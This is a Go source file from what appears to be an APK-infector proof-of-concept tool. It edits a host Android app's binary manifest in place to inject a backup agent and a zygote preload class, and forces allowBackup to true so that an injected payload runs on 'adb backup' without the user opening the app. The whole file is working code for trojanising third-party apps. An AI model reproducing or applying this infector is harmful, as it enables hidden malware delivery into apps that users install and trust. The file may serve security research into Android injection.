package manifest

// Application-attribute injection vectors.
//
// Two attributes are written into the start tag of <application>:
//
//   - android:backupAgent (0x0101027f) = aaaaaaaaaaaa.ArchinomeBackupAgent.
//     The platform instantiates the declared BackupAgent when a backup or
//     restore for the app runs (BackupManagerService, adb backup/restore,
//     `bmgr`), i.e. it is another entry point into the host process that needs
//     neither the launcher nor a custom Application class. BackupManagerService
//     starts the agent's process on its own, so the payload fires on a
//     `adb backup` without the user ever opening the app.
//   - android:allowBackup (0x01010280) = true. A host that declares
//     allowBackup="false" is skipped by the backup machinery entirely, so the
//     flag above would be dead weight: PatchBackupAgent guarantees it.
//   - android:zygotePreloadName (0x0101059d) = aaaaaaaaaaaa.ArchinomeZygotePreload.
//     Names the class the app zygote preloads before forking any app process.
//     It only has an effect together with a service carrying
//     android:useAppZygote (see service_patch.go): without it the platform
//     gives the app a plain (empty) app zygote.
//
// All three go through the same in-place AXML editor as the element vectors
// (service_patch.go) because they share its two hard requirements: an attribute
// name has to land on the string-pool index that is also its resource-map index,
// and the attribute list of <application> has to stay sorted by ascending
// resolved resource id, or PackageManagerService drops the attribute silently.
//
// allowBackup is special-cased: when the attribute already exists its value is
// rewritten in place (4 bytes at a fixed offset) - the slot keeps its size, so
// no other offset in the file has to be fixed up. The other two attributes are
// repointed when the host already declared them (repoint of an existing value)
// and spliced in as new 20-byte slots when it did not; the resource ids are
// ascending in both cases (0x0101027f < 0x01010280 < 0x0101059d).

import (
	"log"
	"os"
	"strconv"

	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
)

// PatchBackupAgent points android:backupAgent at the injected agent and makes
// sure android:allowBackup is true, rewriting the binary manifest at
// utils.ManifestBinaryPath in place.
func PatchBackupAgent() {
	data, err := os.ReadFile(utils.ManifestBinaryPath)
	if err != nil {
		log.Panicf("Failed to read %s", utils.ManifestBinaryPath)
	}

	p := newAxPatch(data)
	appStart := findApplicationElement(data, p.pool)

	var specs []attrSpec

	// ---------------------------------------------------- android:backupAgent
	if a, ok := findAttrByResID(data, appStart, p.resIDs, resIDBackupAgent); ok {
		old := attrStringValue(p.pool, data, a)
		p.repointStringAttr(a, p.addString(backupAgentClassName))
		log.Printf("android:backupAgent present (%q) -> value repointed to %s", old, backupAgentClassName)
	} else {
		specs = append(specs, attrSpec{
			resID:    resIDBackupAgent,
			name:     "backupAgent",
			valueIdx: p.addString(backupAgentClassName),
			dataType: uint8(AttrTypeString),
		})
		log.Printf("android:backupAgent absent -> adding attribute (value=%s)", backupAgentClassName)
	}

	// ---------------------------------------------------- android:allowBackup
	if a, ok := findAttrByResID(data, appStart, p.resIDs, resIDAllowBackup); ok {
		switch {
		case a.dataType == uint8(AttrTypeIntBool) && a.data == attrBoolTrue:
			log.Printf("android:allowBackup is already true; left untouched")
		case a.data == 0:
			// false (0x12/0) or a resource resolving to false: force the typed
			// value to boolean true in place, the slot does not change size
			p.setBooleanTrue(a)
			log.Printf("android:allowBackup was %s (dataType 0x%02x, data 0x%08x) -> rewritten to true in place",
				attrStringValueOrDec(p.pool, data, a), a.dataType, a.data)
		default:
			log.Printf("android:allowBackup holds an unexpected value (dataType 0x%02x, data 0x%08x); left untouched",
				a.dataType, a.data)
		}
	} else {
		specs = append(specs, attrSpec{
			resID:    resIDAllowBackup,
			name:     "allowBackup",
			dataType: uint8(AttrTypeIntBool),
			data:     attrBoolTrue,
		})
		log.Printf("android:allowBackup absent -> adding attribute (value=true)")
	}

	// ascending resource id order: 0x0101027f then 0x01010280
	p.insertAttrs(appStart, specs)

	out := p.commit("android:backupAgent + android:allowBackup")
	utils.WriteChanges(out, utils.ManifestBinaryPath)
}

// PatchZygotePreload points android:zygotePreloadName at the injected preload
// class, rewriting the binary manifest at utils.ManifestBinaryPath in place.
func PatchZygotePreload() {
	data, err := os.ReadFile(utils.ManifestBinaryPath)
	if err != nil {
		log.Panicf("Failed to read %s", utils.ManifestBinaryPath)
	}

	p := newAxPatch(data)
	appStart := findApplicationElement(data, p.pool)

	if a, ok := findAttrByResID(data, appStart, p.resIDs, resIDZygotePreloadName); ok {
		old := attrStringValue(p.pool, data, a)
		if old == zygotePreloadClassName {
			log.Printf("android:zygotePreloadName already points at %s; left untouched", old)
			return
		}
		p.repointStringAttr(a, p.addString(zygotePreloadClassName))
		log.Printf("android:zygotePreloadName present (%q) -> value repointed to %s", old, zygotePreloadClassName)
	} else {
		p.insertAttrs(appStart, []attrSpec{{
			resID:    resIDZygotePreloadName,
			name:     "zygotePreloadName",
			valueIdx: p.addString(zygotePreloadClassName),
			dataType: uint8(AttrTypeString),
		}})
		log.Printf("android:zygotePreloadName absent -> adding attribute (value=%s)", zygotePreloadClassName)
	}

	out := p.commit("android:zygotePreloadName")
	utils.WriteChanges(out, utils.ManifestBinaryPath)
}

// attrStringValueOrDec renders an attribute value for the log: the string for a
// string attribute, the decimal typed value otherwise.
func attrStringValueOrDec(pool *stringPool, data []byte, a xmlAttr) string {
	if a.dataType == uint8(AttrTypeString) {
		return attrStringValue(pool, data, a)
	}
	return strconv.FormatInt(int64(int32(a.data)), 10)
}
